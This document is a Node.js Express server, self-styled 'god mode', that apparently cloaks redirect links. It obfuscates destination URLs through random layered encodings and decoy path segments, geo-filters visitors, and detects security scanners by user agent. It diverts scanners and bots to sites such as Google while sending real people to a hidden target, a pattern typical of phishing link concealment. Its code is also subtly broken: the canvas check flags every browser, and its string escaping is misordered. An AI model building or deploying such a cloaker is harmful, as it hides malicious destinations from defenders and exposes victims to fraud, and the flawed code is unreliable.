const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');
const NodeCache = require('node-cache');

const app = express();

app.set('trust proxy', 1);

// ────────────────────────────────────────────────
// CONFIGURATION
// ────────────────────────────────────────────────
const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';

const BOT_URLS = [
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.google.com',
  'https://www.bbc.com',
  'https://www.youtube.com'
];

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);

const LOG_FILE = 'clicks.log';
const PORT = process.env.PORT || 10000;

const geoCache = new NodeCache({ stdTTL: 86400, checkperiod: 600 });

// ────────────────────────────────────────────────
// MIDDLEWARE
// ────────────────────────────────────────────────
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('hex');
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'"],
      frameSrc: ["'self'"],
    },
  },
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// Health endpoints
app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));

// ────────────────────────────────────────────────
// HELPERS
// ────────────────────────────────────────────────
function isMobile(req) {
  return /android|iphone|ipad|ipod|mobi/i.test((req.headers['user-agent'] || '').toLowerCase());
}

// ────────────────────────────────────────────────
// SERVER-SIDE BOT DETECTION
// ────────────────────────────────────────────────
const strictLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: (req) => isMobile(req) ? 12 : 4,
  standardHeaders: true,
  legacyHeaders: false,
});

const suspiciousUA = [
  /headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i,
  /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i,
  /zoomeye/i, /nmap/i, /gobuster/i
];

function isLikelyBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  const ref = (req.headers['referer'] || '').toLowerCase();
  const accept = req.headers['accept'] || '';

  let score = 0;

  if (suspiciousUA.some(r => r.test(ua))) score += 40;
  if (!ua.includes('mozilla')) score += 25;
  if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 20;
  if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 15;
  if (!accept.includes('text/html')) score += 15;

  if (!isMobile(req)) {
    if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) score += 30;
    if (!req.headers['sec-fetch-dest'] || !req.headers['sec-fetch-mode'] || !req.headers['sec-fetch-site']) score += 30;
  }

  if (!req.headers['upgrade-insecure-requests']) score += 18;
  if (!req.headers['accept-language'] || req.headers['accept-language'].length < 5) score += 20;
  if (Object.keys(req.headers).length < 12) score += 25;

  const keys = Object.keys(req.headers);
  if (keys.join() === [...keys].sort().join()) score += 25;

  console.log(`[BOT-SCORE] Mobile=${isMobile(req)} | Score=${score} | UA=${ua.substring(0,100)}...`);

  return score >= 70;
}

// ────────────────────────────────────────────────
// GEO LOOKUP – CACHED + AUTHENTICATED
// ────────────────────────────────────────────────
async function getCountryCode(req) {
  let ip = (req.headers['x-forwarded-for']?.split(',')[0]?.trim()) ||
           req.headers['x-real-ip'] ||
           req.ip || 'unknown';

  if (ip === 'unknown' || ip.match(/^(127\.|::1$|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/)) {
    return 'XX';
  }

  let cached = geoCache.get(ip);
  if (cached) {
    console.log(`[GEO-CACHE] ${ip} → ${cached}`);
    return cached;
  }

  const token = process.env.IPINFO_TOKEN;
  if (!token) {
    console.warn('[GEO] No IPINFO_TOKEN set');
    return 'XX';
  }

  try {
    const res = await fetch(`https://api.ipinfo.io/${ip}/country?token=${token}`, {
      timeout: 4000,
      headers: { 'User-Agent': 'godmode-redirector/1.0' }
    });

    if (res.ok) {
      const data = await res.json();
      const cc = data.country?.toUpperCase();
      if (cc && /^[A-Z]{2}$/.test(cc)) {
        geoCache.set(ip, cc);
        console.log(`[GEO] ${ip} → ${cc} (cached)`);
        return cc;
      }
    }
  } catch (e) {
    console.error(`[GEO-ERR] ${ip} → ${e.message}`);
  }

  return 'XX';
}

// ────────────────────────────────────────────────
// ENCODERS (fixed rot13)
// ────────────────────────────────────────────────
const encoders = [
  { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
  { name: 'rot13',
    enc: s => s.replace(/[a-zA-Z]/g, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
    }),
    dec: s => s.replace(/[a-zA-Z]/g, c => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((c.charCodeAt(0) - base - 13 + 26) % 26) + base);
    })
  },
  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
  { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
];

// ────────────────────────────────────────────────
// MULTI-LAYER ENCODE / DECODE
// ────────────────────────────────────────────────
function multiLayerEncode(str) {
  let result = str;
  const noise = crypto.randomBytes(8).toString('hex');
  result = noise + result + noise;

  const shuffled = [...encoders].sort(() => Math.random() - 0.5);
  const selected = shuffled.slice(0, 5);

  for (const layer of selected) {
    result = layer.enc(result);
  }

  result = encodeURIComponent(result);
  result = encodeURIComponent(result);

  return { encoded: result, layers: selected.map(e => e.name).reverse(), noise };
}

function multiLayerDecode(encoded, layers, noise) {
  let result = decodeURIComponent(decodeURIComponent(encoded));

  for (const layerName of layers) {
    const layer = encoders.find(e => e.name === layerName);
    if (layer) result = layer.dec(result);
  }

  if (result.startsWith(noise) && result.endsWith(noise)) {
    result = result.slice(noise.length, -noise.length);
  }

  return result;
}

// ────────────────────────────────────────────────
// /generate endpoint
// ────────────────────────────────────────────────
app.get('/generate', (req, res) => {
  const target = req.query.target || TARGET_URL;
  const noisy = target + '#' + crypto.randomBytes(8).toString('hex') + '-' + Date.now();

  const { encoded, layers, noise } = multiLayerEncode(noisy);
  const layersEnc = Buffer.from(JSON.stringify({ layers, noise })).toString('base64url');

  const segments = Array(6).fill().map((_, i) =>
    crypto.randomBytes(8).toString('hex') +
    Math.random().toString(36).substring(2, 12).toUpperCase() +
    (i % 2 ? 'verify' : 'session')
  );

  const path = `/r/${segments.join('/')}/${crypto.randomBytes(12).toString('hex')}`;

  const params = [];
  const keys = ['sid','tok','ref','utm_src','clid','ver','ts','hmac','nonce','_t','cid','fid','l'];
  for (let i = 0; i < 13; i++) {
    const k = keys[i % keys.length] + (i > 6 ? '_' + (i + 1) : '');
    const v = k.startsWith('l') ? layersEnc : encodeURIComponent(crypto.randomBytes(12).toString('base64url'));
    params.push(`${k}=${v}`);
  }

  const url = `https://${req.hostname}${path}?p=${encoded}&${params.join('&')}&v=8.1.${Math.floor(Math.random()*100)}`;

  res.json({ success: true, tracked: url });
});

// ────────────────────────────────────────────────
// MAIN /r/* ROUTE – GOD MODE
// ────────────────────────────────────────────────
app.get('/r/*', strictLimiter, async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';

  const country = await getCountryCode(req);

  let geoAllowed = true;
  if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
  if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;

  if (!geoAllowed || isLikelyBot(req)) {
    fs.appendFile(LOG_FILE, `${new Date().toISOString()} BLOCK ${ip} ${country} UA:${ua}\n`, () => {});
    return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
  }

  fs.appendFile(LOG_FILE, `${new Date().toISOString()} PASS ${ip} ${country} UA:${ua}\n`, () => {});

  // Decode target safely
  let redirectTarget = TARGET_URL;
  try {
    const params = new URLSearchParams(req.url.split('?')[1] || '');
    const enc = params.get('p') || '';
    const layersB64 = params.get('l') || '';

    if (enc && layersB64) {
      let layersData;
      try {
        layersData = JSON.parse(Buffer.from(layersB64, 'base64url').toString());
      } catch {
        console.warn(`[DECODE-JSON-ERR] ${ip}`);
        layersData = { layers: [], noise: '' };
      }

      let decoded = multiLayerDecode(enc, layersData.layers, layersData.noise);
      decoded = decoded.split('#')[0];
      if (!/^https?:\/\//i.test(decoded)) decoded = 'https://' + decoded;

      try {
        const urlObj = new URL(decoded);
        if (['http:', 'https:'].includes(urlObj.protocol)) {
          redirectTarget = decoded;
        }
      } catch {}
    }
  } catch (e) {
    console.error(`[DECODE-ERR] ${ip} → ${e.message}`);
  }

  const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");

  const hpSuffix = crypto.randomBytes(4).toString('hex');

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying...</title>
  <style>
    body { margin:0; background:#000; color:#fff; font-family:sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; }
    .visually-hidden { position:absolute !important; width:1px !important; height:1px !important; padding:0 !important; margin:-1px !important; overflow:hidden !important; clip:rect(0,0,0,0) !important; border:0 !important; }
  </style>
</head>
<body>
  <div>Verifying request •••</div>

  <div class="visually-hidden">
    <input type="text" id="hpw_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="text" id="hpc_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="text" id="hpe_${hpSuffix}" autocomplete="off" tabindex="-1">
    <input type="checkbox" id="hpx_${hpSuffix}" tabindex="-1">
  </div>

  <script nonce="${res.locals.nonce}">
    const TARGET = '${safeTarget}';
    const BOT = '${BOT_URLS[0]}';

    let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
    let focusLost = 0;

    function updateEntropy(dx, dy) {
      const dt = (Date.now() - lastTime) / 1000 || 1;
      entropy += Math.log2(1 + Math.hypot(dx, dy)) / dt * 1.6;
      lastTime = Date.now();
      moves++;
    }

    document.addEventListener('mousemove', e => {
      if (lastX && lastY) updateEntropy(Math.abs(e.clientX - lastX), Math.abs(e.clientY - lastY));
      lastX = e.clientX; lastY = e.clientY;
    });

    document.addEventListener('touchmove', e => {
      if (e.touches?.length) {
        const t = e.touches[0];
        if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY));
        lastX = t.clientX; lastY = t.clientY;
      }
    }, {passive: true});

    document.addEventListener('visibilitychange', () => { if (document.hidden) focusLost++; });

    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top'; ctx.font = '14px Arial';
    ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
    ctx.fillStyle = '#069'; ctx.fillText('Hello, world!',2,15);
    ctx.fillStyle = 'rgba(102,204,0,0.7)'; ctx.fillText('Hello, world!',4,17);
    const fp = c.toDataURL();

    function isHoneypotFilled() {
      return document.getElementById('hpw_${hpSuffix}')?.value.trim() ||
             document.getElementById('hpc_${hpSuffix}')?.value.trim() ||
             document.getElementById('hpe_${hpSuffix}')?.value.trim() ||
             document.getElementById('hpx_${hpSuffix}')?.checked;
    }

    setTimeout(() => {
      const mobile = /Mobi|Android/i.test(navigator.userAgent);

      const suspicious =
        isHoneypotFilled() ||
        entropy < (mobile ? 4.5 : 16) ||
        moves < (mobile ? 2 : 5) ||
        fp.includes('iVBORw0KGgo') ||
        navigator.webdriver === true ||
        (window.outerWidth === 0 || window.outerHeight === 0) ||
        (navigator.languages?.length ?? 0) < 1 ||
        navigator.maxTouchPoints === undefined ||
        focusLost > (mobile ? 6 : 3);

      console.log(\`[GOD-CHECK] ent:\${entropy.toFixed(1)} mov:\${moves} hp:\${isHoneypotFilled() ? 'FILLED' : 'empty'} fpSusp:\${fp.includes('iVBORw0KGgo') ? 'yes' : 'no'} → \${suspicious ? 'BOT' : 'HUMAN'}\`);

      location.href = suspicious ? BOT : TARGET;
    }, 1200 + Math.random() * 1600);

    setTimeout(() => location.href = BOT, 5000);
  </script>
</body>
</html>
  `);
});

app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`God-mode listening on ${PORT}`);
});
